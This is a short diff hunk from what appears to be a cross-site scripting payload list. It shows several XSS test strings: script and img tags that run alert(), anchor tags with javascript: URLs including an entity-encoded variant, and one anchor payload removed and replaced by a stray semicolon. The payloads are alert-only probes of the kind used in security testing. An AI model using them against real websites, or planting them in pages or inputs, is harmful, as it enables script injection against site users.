@@ -163,8 +163,7 @@ alert（document.domain）" location 。href = " javascript：alert（document.d
 
 >"'><img src="javascript:alert('XSS')">
 
-'><a hret="javascript:alert(1)">
-
+;
 '><a hret="javascr&#x69pt:alert(1)">
 
 >"'><script>alert('XSS')</script>
